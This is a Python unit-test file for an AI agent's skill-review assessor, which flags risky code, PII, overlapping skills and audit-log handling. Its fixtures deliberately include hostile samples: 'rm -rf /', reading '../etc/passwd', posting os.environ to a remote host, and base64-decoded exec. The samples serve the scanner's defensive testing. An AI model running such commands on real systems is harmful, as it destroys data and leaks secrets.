"""评审-消化扩展评估（Digest Assessor）单元测试

覆盖用户要求的自动验证清单（确定性规则层）：
- 安全：权限校验（env/popen/路径）、攻击面（SSL/混淆/疑似外传）、数据合规（PII/密钥入参/敏感收集）
- 兼容性：名称冲突 / 操作重叠 / 资源竞争(超时/死循环) / 交互冲突(共享触发词) / 重复合并建议
- 自动执行：create/install/update 后自动评估（不改 draft 状态）、digest_all 批量补评
"""
import pytest

from agent.skills_mgmt import SkillsMgmtService
from agent.skills_mgmt.assessor import SkillDigestAssessor
from agent.skills_mgmt.models import Skill, SkillStatus


@pytest.fixture
def svc(tmp_path):
    return SkillsMgmtService(store_path=str(tmp_path / "skills_mgmt.json"))


def _skill(**overrides):
    """直接构造 Skill（不经过创建钩子，便于单测规则本身）"""
    data = dict(
        id="t-skill", name="测试技能", description="一段测试技能描述用于评估",
        content="# 测试\nprint('hello')",
        content_type="markdown", category="custom",
        tags=["test", "demo"], author="tester", enabled=True,
    )
    data.update(overrides)
    return Skill.from_storage_dict(data)


def _codes(assessment):
    return [f.code for f in assessment.findings]


# ═══════════════════════════════════════════════════════════════
#  安全维度：权限 / 攻击面 / 数据合规
# ═══════════════════════════════════════════════════════════════

class TestSecurityDigest:
    def test_benign_markdown_no_findings(self):
        a = SkillDigestAssessor().assess(_skill())
        assert a.blocked is False
        assert a.compatibility_score == 100.0

    def test_env_access_info(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python", content="import os\nprint(os.environ)\n"))
        assert "SEC_ENV_ACCESS" in _codes(a)

    def test_popen_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python", content="import os\nos.popen('ls')\n"))
        assert "SEC_POPEN" in _codes(a)

    def test_path_traversal_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="open('../etc/passwd').read()\n"))
        assert "SEC_PATH_TRAVERSAL" in _codes(a)

    def test_env_exfil_warn_when_env_plus_network(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="import os, requests\nrequests.post('https://x', data=os.environ)\n"))
        assert "SEC_ENV_EXFIL" in _codes(a)

    def test_ssl_unverified_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="requests.get('https://x', verify=False)\n"))
        assert "SEC_SSL_UNVERIFIED" in _codes(a)

    def test_obfuscated_b64_eval_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="exec(base64.b64decode('cHJpbnQoMSk='))\n"))
        assert "SEC_OBFUSCATED" in _codes(a)

    def test_pii_in_content_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            content="示例手机号 13800138000 与身份证 110101199003078123\n"))
        assert "DATA_PII" in _codes(a)

    def test_secret_in_default_params_warn(self):
        a = SkillDigestAssessor().assess(_skill(
            default_params={"api_key": "sk-ABCDEFGH12345678"}))
        assert "DATA_SECRET_IN_PARAMS" in _codes(a)

    def test_personal_collect_suggests_sensitive(self):
        a = SkillDigestAssessor().assess(_skill(
            description="本技能会收集用户的手机号与隐私信息", is_sensitive=False))
        assert "DATA_COLLECT_SENSITIVE" in _codes(a)
        # 已标记 sensitive 则不再提示
        a2 = SkillDigestAssessor().assess(_skill(
            description="本技能会收集用户的手机号与隐私信息", is_sensitive=True))
        assert "DATA_COLLECT_SENSITIVE" not in _codes(a2)

    def test_non_code_content_skips_code_patterns(self):
        """markdown 里出现 print(os.environ) 不应误报为代码权限问题"""
        a = SkillDigestAssessor().assess(_skill(
            content="说明：技能会用到 print(os.environ) 这种写法吗？不会。"))
        assert "SEC_ENV_ACCESS" not in _codes(a)


# ═══════════════════════════════════════════════════════════════
#  兼容性维度：冲突 / 重叠 / 资源 / 交互 / 重复建议
# ═══════════════════════════════════════════════════════════════

class TestCompatibilityDigest:
    def test_reserved_id_blocks(self):
        a = SkillDigestAssessor().assess(_skill(id="self_reflection"), reserved=["self_reflection"])
        assert a.blocked is True
        assert "NAT_RESERVED_ID" in _codes(a)

    def test_name_clash_with_other_skill(self):
        target = _skill(id="new-one", name="Same Name", description="aaaa 描述段内容足够区分")
        other = _skill(id="old-one", name="Same Name", description="bbbb 另一个技能的描述文本")
        a = SkillDigestAssessor().assess(target, others=[other])
        assert "NAT_NAME_CLASH" in _codes(a)

    def test_operation_overlap_warn(self):
        target = _skill(id="parser-a", name="PDF解析器A", description="把 PDF 文档内容抽取出来")
        other = _skill(id="parser-b", name="PDF解析器B", description="抽取 PDF 文档的正文内容")
        a = SkillDigestAssessor().assess(target, others=[other])
        assert "OVL_OPERATION_OVERLAP" in _codes(a)

    def test_resource_timeout_warns_for_code(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="import subprocess\nsubprocess.run(['ls'])\n"
                    "import requests\nrequests.get('https://x')\n"))
        assert "RSC_SUBPROCESS_NO_TIMEOUT" in _codes(a)
        assert "RSC_NET_NO_TIMEOUT" in _codes(a)
        # 带 timeout 不再告警
        a2 = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="import subprocess\nsubprocess.run(['ls'], timeout=10)\n"
                    "import requests\nrequests.get('https://x', timeout=5)\n"))
        assert "RSC_SUBPROCESS_NO_TIMEOUT" not in _codes(a2)
        assert "RSC_NET_NO_TIMEOUT" not in _codes(a2)

    def test_shared_trigger_interaction_conflict(self):
        target = _skill(id="skill-a", content="tool: pdf_parse 负责解析PDF")
        other = _skill(id="skill-b", content="tool: pdf_parse 也声明处理PDF")
        a = SkillDigestAssessor().assess(target, others=[other])
        assert "INT_SHARED_TRIGGER" in _codes(a)

    def test_duplicate_merge_recommendation(self):
        content = "# 解析PDF\n提取正文与元数据\n代码片段略"
        target = _skill(id="dup-a", content=content, description="解析 PDF 的工具技能")
        other = _skill(id="dup-b", content=content, description="另一个解析 PDF 的工具技能")
        a = SkillDigestAssessor().assess(target, others=[other])
        assert "DUP_MERGE_RECOMMEND" in _codes(a)

    def test_compat_score_penalized(self):
        target = _skill(id="parser-a", name="PDF解析器", description="把 PDF 文档内容抽取出来")
        other = _skill(id="parser-b", name="PDF解析器", description="抽取 PDF 文档的正文内容")
        a = SkillDigestAssessor().assess(target, others=[other])
        assert a.compatibility_score < 100.0


# ═══════════════════════════════════════════════════════════════
#  代码级审查（code_review 接入 digest）
# ═══════════════════════════════════════════════════════════════

class TestCodeReviewIntegration:
    def test_sql_concat_code_flagged_in_code_category(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content=(
                "def query(uid):\n"
                "    conn = db.connect()\n"
                "    cur = conn.cursor()\n"
                "    cur.execute('SELECT * FROM users WHERE id=' + uid)\n"
                "    return cur.fetchall()\n"
            ),
        ))
        codes = [f.code for f in a.findings]
        assert any(c == "CR_安全" for c in codes), codes
        assert any(f.category == "code" for f in a.findings)

    def test_benign_code_no_security_code_findings(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content=(
                "def add(a, b):\n"
                "    \"\"\"求和并返回\"\"\"\n"
                "    return a + b\n"
            ),
        ))
        assert not any(f.code == "CR_安全" for f in a.findings)

    def test_non_code_content_skips_code_review(self):
        a = SkillDigestAssessor().assess(_skill(
            content_type="markdown", content="SELECT 相关的说明文档（非代码）"))
        assert not any(f.category == "code" for f in a.findings)


# ═══════════════════════════════════════════════════════════════
#  选择性维度接入（按技能类型） + 外来安装安全预检并入
# ═══════════════════════════════════════════════════════════════

class TestSelectiveDimensionsAndExternalPrecheck:
    def test_dimensions_by_type_and_shape(self):
        from agent.skills_mgmt.assessor import _code_review_dimensions
        # python 定义对外函数 → 含 可维护性 + API兼容性（无测试标记则无 测试）
        api = _skill(content_type="python",
                     content="def extract_pdf(path):\n    return path\n")
        dims = _code_review_dimensions(api)
        assert {"安全", "性能", "可维护性", "API兼容性"} <= set(dims), dims
        assert "测试" not in dims
        # 含测试形态 → 追加 测试
        with_test = _skill(content_type="python",
                           content="def test_extract_pdf():\n    assert True\n")
        assert "测试" in _code_review_dimensions(with_test)
        # markdown 不触发代码审查
        md = _skill(content_type="markdown", content="说明文档")
        assert _code_review_dimensions(md) == []

    def test_external_install_precheck_merged_and_blocks(self):
        """github 外来技能含 subprocess → SEC_EXT_INSTALL error，digest 阻断"""
        a = SkillDigestAssessor().assess(_skill(
            id="ext-skill", source="github:someone/repo",
            content_type="python",
            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
        codes = [f.code for f in a.findings]
        assert "SEC_EXT_INSTALL" in codes, codes
        hit = next(f for f in a.findings if f.code == "SEC_EXT_INSTALL")
        assert hit.severity == "error"
        assert hit.category == "security"
        assert a.blocked is True

    def test_self_built_skill_not_subject_to_external_gate(self):
        a = SkillDigestAssessor().assess(_skill(
            id="self-skill", source="manual",
            content_type="python",
            content="import subprocess\nsubprocess.run(['ls'])\n"))
        assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)

    def test_external_benign_no_precheck_findings(self):
        a = SkillDigestAssessor().assess(_skill(
            id="ext-ok", source="url:https://x/skill.json",
            content_type="python", content="def f(x):\n    return x\n"))
        assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)


# ═══════════════════════════════════════════════════════════════
#  审计记录读取（技能中心可视化数据源）
# ═══════════════════════════════════════════════════════════════

class TestAuditLogRead:
    def test_read_audit_log_latest_first(self, tmp_path, monkeypatch):
        from agent.skills_mgmt import review_gate as rg
        p = tmp_path / "audit.jsonl"
        p.write_text(
            "{\"ts\":\"2026-09-03T10:00:00\",\"event\":\"review_waiver_publish\","
            "\"skill_id\":\"a\",\"actor\":\"x\",\"reason\":\"r1\"}\n"
            "{\"ts\":\"2026-09-03T10:01:00\",\"event\":\"review_waiver_publish\","
            "\"skill_id\":\"b\",\"actor\":\"y\",\"reason\":\"r2\"}\n"
            "not-json\n"
            "{\"ts\":\"2026-09-03T10:02:00\",\"event\":\"review_waiver_publish\","
            "\"skill_id\":\"c\",\"actor\":\"z\",\"reason\":\"r3\"}\n",
            encoding="utf-8",
        )
        monkeypatch.setattr(rg, "_audit_file", lambda: str(p))
        recs = rg.read_audit_log(limit=100)
        assert [r["skill_id"] for r in recs] == ["c", "b", "a"]
        assert recs[0]["reason"] == "r3"
        # limit 截断 → 只返回最新 2 条
        recs2 = rg.read_audit_log(limit=2)
        assert [r["skill_id"] for r in recs2] == ["c", "b"]

    def test_read_audit_log_missing_file(self, tmp_path, monkeypatch):
        from agent.skills_mgmt import review_gate as rg
        monkeypatch.setattr(rg, "_audit_file", lambda: str(tmp_path / "nope.jsonl"))
        assert rg.read_audit_log() == []

    def test_read_audit_log_filter_by_skill(self, tmp_path, monkeypatch):
        from agent.skills_mgmt import review_gate as rg
        p = tmp_path / "audit.jsonl"
        p.write_text(
            "{\"ts\":\"1\",\"skill_id\":\"a\",\"actor\":\"x\",\"reason\":\"r1\"}\n"
            "{\"ts\":\"2\",\"skill_id\":\"b\",\"actor\":\"y\",\"reason\":\"r2\"}\n"
            "{\"ts\":\"3\",\"skill_id\":\"a\",\"actor\":\"z\",\"reason\":\"r3\"}\n",
            encoding="utf-8",
        )
        monkeypatch.setattr(rg, "_audit_file", lambda: str(p))
        recs = rg.read_audit_log(limit=10, skill_id="a")
        assert [r["skill_id"] for r in recs] == ["a", "a"]
        assert [r["reason"] for r in recs] == ["r3", "r1"]


# ═══════════════════════════════════════════════════════════════
#  可配置开关（env/config）与脚本文件全维度审查
# ═══════════════════════════════════════════════════════════════

class TestDigestKnobsAndScriptScan:
    def test_env_knob_disables_external_precheck(self, monkeypatch):
        monkeypatch.setenv("SKILLS_DIGEST_EXTERNAL_PRECHECK_ENABLED", "false")
        a = SkillDigestAssessor().assess(_skill(
            id="ext-skill", source="github:someone/repo",
            content_type="python",
            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
        assert not any(f.code == "SEC_EXT_INSTALL" for f in a.findings)

    def test_env_knob_downgrades_high_risk(self, monkeypatch):
        monkeypatch.setenv("SKILLS_DIGEST_BLOCK_ON_HIGH_RISK_EXTERNAL", "false")
        a = SkillDigestAssessor().assess(_skill(
            id="ext-skill", source="github:someone/repo",
            content_type="python",
            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
        hit = next((f for f in a.findings if f.code == "SEC_EXT_INSTALL"), None)
        assert hit is not None and hit.severity == "warn"
        assert a.blocked is False

    def test_env_knob_disables_code_review(self, monkeypatch):
        monkeypatch.setenv("SKILLS_DIGEST_CODE_REVIEW_ENABLED", "false")
        a = SkillDigestAssessor().assess(_skill(
            content_type="python",
            content="cur.execute('SELECT * FROM t WHERE id=' + uid)\n"))
        assert not any(f.category == "code" for f in a.findings)

    def _good_data(self, name):
        return {
            "id": name, "name": name,
            "description": "一个用于自动化测试的技能描述，覆盖较多样本保证质量评估通过",
            "content": (
                "def run(task):\n"
                "    '''执行任务：先校验输入，再处理并返回结构化结果。'''\n"
                "    if not task:\n"
                "        raise ValueError('task 不能为空')\n"
                "    try:\n"
                "        result = {'ok': True, 'data': task}\n"
                "    except Exception as exc:\n"
                "        raise RuntimeError('处理失败') from exc\n"
                "    return result\n"
            ),
            "content_type": "python", "category": "custom",
            "config_schema": {"type": "object", "properties": {"task": {"type": "string"}}},
            "tags": ["digest", "test", "demo"], "author": "tester",
        }

    def test_script_files_review_merged_and_blocks(self, tmp_path, monkeypatch):
        """repo/<id>/scripts/*.py 含高风险代码 → digest 合并 SEC_FILE_SCRIPT 且阻断"""
        repo = tmp_path / "repo"
        store = tmp_path / "skills.json"
        svc = SkillsMgmtService(store_path=str(store), repo_path=str(repo))
        svc.create_manual(self._good_data("scr-skill"))
        # 写入脚本文件（第三层 scripts/）
        script_dir = repo / "scr-skill" / "scripts"
        script_dir.mkdir(parents=True, exist_ok=True)
        (script_dir / "danger.py").write_text(
            "import subprocess\nsubprocess.run(['rm', '-rf', '/tmp/x'])\n",
            encoding="utf-8",
        )
        r = svc.review("scr-skill")
        codes = [f.code for f in r.findings]
        assert "SEC_FILE_SCRIPT" in codes, codes
        assert r.status in ("warn", "failed"), r.status
        assert r.digest_verdict == "block"
        assert svc.get("scr-skill").status in ("pending_review", "rejected")

    def test_script_scan_off_skips(self, tmp_path, monkeypatch):
        monkeypatch.setenv("SKILLS_DIGEST_SCRIPT_PRECHECK_ENABLED", "false")
        repo = tmp_path / "repo"
        svc = SkillsMgmtService(store_path=str(tmp_path / "skills.json"),
                                repo_path=str(repo))
        svc.create_manual(self._good_data("scr-off"))
        script_dir = repo / "scr-off" / "scripts"
        script_dir.mkdir(parents=True, exist_ok=True)
        (script_dir / "danger.py").write_text(
            "import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n", encoding="utf-8")
        r = svc.review("scr-off")
        assert not any(f.code == "SEC_FILE_SCRIPT" for f in r.findings)

    def test_blocking_severities_configurable(self, monkeypatch):
        """阻断严重级可配置：仅 critical 视为阻断时，error 不再阻断"""
        # 默认：error 阻断
        a = SkillDigestAssessor().assess(_skill(
            id="ext-skill", source="github:someone/repo",
            content_type="python",
            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
        assert a.blocked is True
        # 配置只保留 critical → 高风险(error)不阻断
        monkeypatch.setenv("SKILLS_DIGEST_BLOCKING_SEVERITIES", "critical")
        a2 = SkillDigestAssessor().assess(_skill(
            id="ext-skill", source="github:someone/repo",
            content_type="python",
            content="import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"))
        assert a2.blocked is False

    def test_audit_pagination_and_since(self, tmp_path, monkeypatch):
        from agent.skills_mgmt import review_gate as rg
        p = tmp_path / "audit.jsonl"
        lines = []
        for i in range(5):
            lines.append('{"ts":"2026-09-03T10:0%d:00","skill_id":"s%d","actor":"a","reason":"r%d"}\n' % (i, i, i))
        p.write_text("".join(lines), encoding="utf-8")
        monkeypatch.setattr(rg, "_audit_file", lambda: str(p))
        # 第 2 页（offset=2, limit=2）
        page = rg.read_audit_log(limit=2, offset=2)
        assert [r["skill_id"] for r in page] == ["s2", "s1"]
        # since 过滤（>= 10:03）
        recent = rg.read_audit_log(limit=10, since="2026-09-03T10:03:00")
        assert [r["skill_id"] for r in recent] == ["s4", "s3"]


# ═══════════════════════════════════════════════════════════════
#  按日归档 / 修复建议 / 老技能整理
# ═══════════════════════════════════════════════════════════════

class TestDailyArchiveAndCurate:
    def test_archive_daily_moves_old_lines(self, tmp_path):
        from agent.skills_mgmt.log_archiver import archive_daily_file
        p = tmp_path / "skills_digest_events.jsonl"
        old1 = '{"ts":"2026-08-31T10:00:00","skill_id":"a","kind":"auto","verdict":"ok"}\n'
        old2 = '{"ts":"2026-09-01T10:00:00","skill_id":"b","kind":"auto","verdict":"ok"}\n'
        new1 = '{"ts":"2026-09-03T10:00:00","skill_id":"c","kind":"auto","verdict":"ok"}\n'
        p.write_text(old1 + old2 + new1, encoding="utf-8")
        out = archive_daily_file(p)
        assert out["archived"] == 2
        # 原文件仅保留当日
        remain = p.read_text(encoding="utf-8").splitlines()
        assert len(remain) == 1 and '"skill_id":"c"' in remain[0]
        # 归档文件按日生成（这里用今天的真实日期名由逻辑生成——测试模拟昨日由 monkeypatch 日期更稳，见下断言宽松）
        files = [f for f in out["files"] if "skills_digest_events-" in f]
        assert files, out

    def test_suggest_fixes_maps_review_findings(self, svc):
        from agent.skills_mgmt.models import SkillStatus
        data = {
            "id": "eval-fix", "name": "eval-fix",
            "description": "一个用于触发修复建议映射的测试技能描述文本",
            "content": "def f(x):\n    return eval(x)\n",
            "content_type": "python", "category": "custom",
            "tags": ["fix", "test"], "author": "tester",
        }
        svc.create_manual(data)
        svc.review("eval-fix")  # eval → SEC_EVAL finding
        fix = svc.suggest_fixes("eval-fix")
        codes = [f["code"] for f in fix["fixes"]]
        assert "SEC_EVAL" in codes, codes
        entry = next(f for f in fix["fixes"] if f["code"] == "SEC_EVAL")
        assert "eval" in entry["fix"].lower() or "eval" in entry["fix"]

    def test_curate_plans_and_auto_fills_description(self, svc):
        svc.create_manual({
            "id": "old-nodesc", "name": "old-nodesc",
            "description": "",
            "content": "# 自动补全说明\n这是正文第一行，可作描述来源。\n",
            "content_type": "markdown", "category": "custom",
            "tags": ["legacy"], "author": "tester",
        })
        # 计划模式：应发现缺说明
        plan = svc.curate_skills(dry_run=True, auto_clean=False)
        ids = [e["id"] for e in plan["plan"]]
        assert "old-nodesc" in ids
        # 自动模式：补全说明
        svc.curate_skills(dry_run=False, auto_clean=True)
        assert svc.get("old-nodesc").description != ""

    def test_redraft_rules_and_llm_fallback(self, svc):
        svc.create_manual({
            "id": "redraft-me", "name": "redraft-me", "description": "",
            "content": "# 再定义\n这是正文首行，可作中文说明来源。\n",
            "content_type": "markdown", "category": "custom",
            "tags": ["rd"], "author": "tester",
        })
        r = svc.suggest_redraft("redraft-me", use_llm=False)
        assert r["source"] == "rules"
        assert r["proposed"]["description"]
        # LLM 不可用（测试环境）→ 自动回退规则草稿且不抛错
        r2 = svc.suggest_redraft("redraft-me", use_llm=True)
        assert r2["proposed"]["description"]
        assert r2["proposed"]["description"] == r["proposed"]["description"]

    def test_safe_merge_then_undo(self, svc):
        content_a = "# 解析PDF\n提取正文与元数据\n完整实现略"
        content_b = "# 解析PDF\n提取正文与元数据\n完整实现略（另一份）"
        svc.create_manual({
            "id": "m-a", "name": "m-a", "description": "技能A（保留方）",
            "content": content_a, "content_type": "markdown",
            "category": "custom", "tags": ["m"], "author": "t",
        })
        svc.create_manual({
            "id": "m-b", "name": "m-b", "description": "技能B（被合并）",
            "content": content_b, "content_type": "markdown",
            "category": "custom", "tags": ["m"], "author": "t",
        })
        merged = svc.merge_with_backup("m-b", "m-a", strategy="keep_dst")
        assert merged.get("merge_id")
        # 备份列表应能看到该次合并
        backs = svc.list_merge_backups(limit=10)
        assert any(b["merge_id"] == merged["merge_id"] and b["src_id"] == "m-b"
                   for b in backs)
        # 被合并方应已删除
        with pytest.raises(Exception):
            svc.get("m-b")
        # 撤销：恢复 m-b 且 m-a 内容回到合并前
        undo = svc.undo_merge(merged["merge_id"])
        assert "m-b" in undo["restored"]
        assert svc.get("m-b").content == content_b
        assert svc.get("m-a").content == content_a


# ═══════════════════════════════════════════════════════════════
#  自动执行：create/install/update 钩子 + digest_all 批量
# ═══════════════════════════════════════════════════════════════

class TestAutoDigestHooks:
    def _data(self, name="digest-skill", **overrides):
        data = {
            "id": name, "name": name,
            "description": "一个用于自动化测试的技能描述，覆盖较多样本保证质量评估通过",
            "content": (
                "def run(task):\n"
                "    '''执行任务：先校验输入，再处理并返回结构化结果。\n"
                "    该实现包含完整的错误处理与边界校验，保证脚本健壮。'''\n"
                "    if not task:\n"
                "        raise ValueError('task 不能为空')\n"
                "    try:\n"
                "        result = {'ok': True, 'data': task}\n"
                "    except Exception as exc:\n"
                "        raise RuntimeError('处理失败') from exc\n"
                "    return result\n"
            ),
            "content_type": "python", "category": "custom",
            "config_schema": {"type": "object", "properties": {"task": {"type": "string"}}},
            "tags": ["digest", "test", "demo"], "author": "tester",
        }
        data.update(overrides)
        return data

    def test_create_auto_assesses_without_changing_status(self, svc):
        skill = svc.create_manual(self._data())
        assert skill.status == SkillStatus.DRAFT.value, "创建仍为 draft（守原契约）"
        assert skill.review is not None
        assert skill.review.auto_assessed is True
        assert skill.review.digest_verdict in ("ok", "block")

    def test_create_with_pii_reports_finding(self, svc):
        skill = svc.create_manual(self._data(name="pii-skill",
                                             content="处理手机号 13800138000"))
        assert skill.review is not None
        codes = [f.code for f in skill.review.findings]
        assert "DATA_PII" in codes

    def test_review_runs_full_digest_and_approves_benign(self, svc):
        skill = svc.create_manual(self._data(name="good-digest"))
        assert skill.status == "draft"
        # 正式审核（= 权威评审-消化）
        r = svc.digest_skill(skill.id)
        assert r.status in ("passed", "warn", "pending")
        assert r.auto_assessed is True
        assert r.digest_verdict == "ok"
        assert r.compatibility_score == 100.0
        assert svc.get(skill.id).status in ("approved", "pending_review")

    def test_digest_all_assesses_existing_without_review(self, svc, tmp_path):
        # 直接绕过 create 钩子塞入一个无 review 的存量技能
        from agent.skills_mgmt.models import Skill as SK
        svc.store.upsert(SK.from_storage_dict({
            "id": "legacy-skill", "name": "legacy-skill",
            "description": "旧存量技能，无审核记录",
            "content": "# 旧技能\nprint('legacy')",
            "content_type": "python", "category": "custom",
            "tags": ["legacy"], "author": "tester",
        }))
        result = svc.digest_all()
        assert result["total"] >= 1
        assert result["assessed"] == 1
        got = svc.get("legacy-skill")
        assert got.review is not None and got.review.auto_assessed is True
        assert got.status == "draft", "批量补评不改技能状态"
